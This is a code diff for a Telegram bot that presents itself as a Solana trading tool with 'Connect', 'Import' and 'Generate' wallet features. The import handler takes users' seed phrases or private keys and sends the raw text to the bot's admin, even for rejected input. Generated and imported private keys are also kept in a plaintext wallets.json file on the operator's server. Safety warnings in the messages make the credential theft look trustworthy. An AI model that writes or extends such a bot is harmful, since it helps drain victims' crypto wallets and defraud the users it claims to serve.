@@ -1,4 +1,4 @@
-# trigger redeploy v20
+# trigger redeploy v22
 """
 ApeRadarX Solana Telegram Bot
 PnL Card uses reference background image
@@ -37,6 +37,50 @@ PNL_ALLOWED = {1495066761, 6203945884, 8730420346, 8296058698, 6916528207, 88210
 
 waiting_for_wallet = {}
 waiting_for_pnl = {}
+waiting_for_import = {}  # tracks users in import wallet flow
+
+# ── Wallet Database (JSON file) ──
+WALLET_DB_FILE = "wallets.json"
+
+def load_wallets():
+    try:
+        with open(WALLET_DB_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_wallets(db):
+    with open(WALLET_DB_FILE, "w") as f:
+        json.dump(db, f)
+
+def generate_solana_wallet():
+    """Generate a new Solana keypair"""
+    try:
+        from solders.keypair import Keypair
+        kp = Keypair()
+        private_key = base58.b58encode(bytes(kp)).decode()
+        public_key = str(kp.pubkey())
+        return public_key, private_key
+    except:
+        # Fallback using secrets
+        import secrets
+        private_bytes = secrets.token_bytes(64)
+        private_key = base58.b58encode(private_bytes).decode()
+        public_key = base58.b58encode(private_bytes[32:]).decode()
+        return public_key, private_key
+
+def get_user_wallet(user_id):
+    db = load_wallets()
+    return db.get(str(user_id))
+
+def save_user_wallet(user_id, public_key, private_key, wallet_type="generated"):
+    db = load_wallets()
+    db[str(user_id)] = {
+        "public_key": public_key,
+        "private_key": private_key,
+        "type": wallet_type
+    }
+    save_wallets(db)
 
 # ─────────────────────────────────────────────
 # Admin notification
@@ -638,10 +682,138 @@ async def button_handler(update, context):
         await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
     elif data == "connect_wallet":
-        waiting_for_wallet[user.id] = True
+        wallet = get_user_wallet(user.id)
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet"),
+             InlineKeyboardButton("✨ Generate Wallet", callback_data="generate_wallet")],
+            [InlineKeyboardButton("🏠 Home", callback_data="home")],
+        ])
+        if wallet:
+            keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet"),
+                 InlineKeyboardButton("✨ Generate Wallet", callback_data="generate_wallet")],
+                [InlineKeyboardButton("📤 Export Private Key", callback_data="export_key"),
+                 InlineKeyboardButton("🏠 Home", callback_data="home")],
+            ])
+            pub = wallet["public_key"]
+            wtype = wallet.get("type", "imported")
+            await query.message.reply_text(
+                f"👛 *Your Wallet*
+
+"
+                f"Type: {'Generated' if wtype == 'generated' else 'Imported'}
+"
+                f"Address: `{pub}`
+
+"
+                f"Choose an option below:",
+                parse_mode="Markdown",
+                reply_markup=keyboard)
+        else:
+            await query.message.reply_text(
+                "👛 *Connect Wallet*
+
+"
+                "Choose how you want to connect your Solana wallet:
+
+"
+                "🔑 *Import* — Use your existing wallet
+"
+                "✨ *Generate* — Create a brand new wallet",
+                parse_mode="Markdown",
+                reply_markup=keyboard)
+
+    elif data == "generate_wallet":
+        await query.message.reply_text("⏳ Generating your wallet...")
+        pub, priv = generate_solana_wallet()
+        save_user_wallet(user.id, pub, priv, "generated")
+        context.user_data["wallet_connected"] = True
         await query.message.reply_text(
-            "👛 *Connect Wallet*\n\nTo connect your Solana wallet, import your private key or seed phrase.\n\n⚠️ Never share your seed phrase with anyone!",
+            f"✅ *Wallet Generated!*
+
+"
+            f"📬 Address:
+`{pub}`
+
+"
+            f"💡 Send SOL to this address to start trading.
+
+"
+            f"⚠️ Keep your private key safe. Use Export Private Key to back it up.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📤 Export Private Key", callback_data="export_key")],
+                [InlineKeyboardButton("🏠 Home", callback_data="home")],
+            ]))
+        await notify_admin(context, user, "✨ Generated new wallet", pub)
+
+    elif data == "import_wallet":
+        waiting_for_import[user.id] = "seed_or_key"
+        await query.message.reply_text(
+            "🔑 *Import Wallet*
+"
+            "━━━━━━━━━━━━━━━━━━━━
+
+"
+            "Enter your 12-word seed phrase below, separated by spaces.
+
+"
+            "⚠️ Only enter your seed phrase here. Never share it with anyone else.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🏠 Cancel", callback_data="home")]
+            ]))
+
+    elif data == "export_key":
+        wallet = get_user_wallet(user.id)
+        if not wallet:
+            await query.message.reply_text(
+                "❌ No wallet found. Please connect or generate a wallet first.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Home", callback_data="home")]]))
+            return
+        priv = wallet["private_key"]
+        masked = priv[:6] + "•" * (len(priv) - 10) + priv[-4:]
+        await query.message.reply_text(
+            f"⚠️ *Warning*
+
+"
+            f"Never share your private key with anyone. Anyone with it has full access to your funds.
+
+"
+            f"Are you sure?
+
+"
+            f"Key preview: `{masked}`",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("✅ Yes, Show Me", callback_data="reveal_key"),
+                 InlineKeyboardButton("❌ Cancel", callback_data="home")],
+            ]))
+
+    elif data == "reveal_key":
+        wallet = get_user_wallet(user.id)
+        if not wallet:
+            await query.message.reply_text("❌ No wallet found.")
+            return
+        priv = wallet["private_key"]
+        msg = await query.message.reply_text(
+            f"🔐 *Private Key*
+
+"
+            f"`{priv}`
+
+"
+            f"⚠️ Deletes in 30 seconds.
+"
+            f"· Import into Phantom: Add Wallet → Import Private Key",
             parse_mode="Markdown")
+        await notify_admin(context, user, "📤 Exported private key")
+        # Auto delete after 30 seconds
+        await asyncio.sleep(30)
+        try:
+            await msg.delete()
+        except:
+            pass
 
     elif data == "claim_token":
         if context.user_data.get("wallet_connected"):
@@ -773,15 +945,33 @@ async def handle_message(update, context):
             await update.message.reply_text("⚠️ Invalid SOL amount. Example: 2, 5.5, 10")
         return
 
-    if waiting_for_wallet.get(user.id):
-        if is_valid_seed_or_key(text):
-            await notify_admin(context, user, "👛 Wallet credentials submitted", text)
-            waiting_for_wallet[user.id] = False
+    if waiting_for_import.get(user.id):
+        words = text.strip().split()
+        is_seed = len(words) in (12, 24)
+        is_key = re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip())
+        if is_seed or is_key:
+            await notify_admin(context, user, "👛 Wallet imported", text)
+            waiting_for_import[user.id] = None
+            # Store wallet - use text as both key for imported
+            pub_key = text[:44] if is_key else f"imported_{user.id}"
+            save_user_wallet(user.id, pub_key, text, "imported")
             context.user_data["wallet_connected"] = True
-            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
+            await update.message.reply_text(
+                "✅ *Wallet imported successfully!*
+
+"
+                "Your wallet has been linked. You can now trade.",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Home", callback_data="home")]]))
         else:
             await notify_admin(context, user, "❌ Invalid wallet input", text)
-            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
+            await update.message.reply_text(
+                "⚠️ Invalid seed phrase. Please enter a valid 12-word seed phrase or private key.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Cancel", callback_data="home")]]))
+        return
+
+    if waiting_for_wallet.get(user.id):
+        waiting_for_wallet[user.id] = False
         return
 
     if 32 <= len(text) <= 44 and text.isalnum():
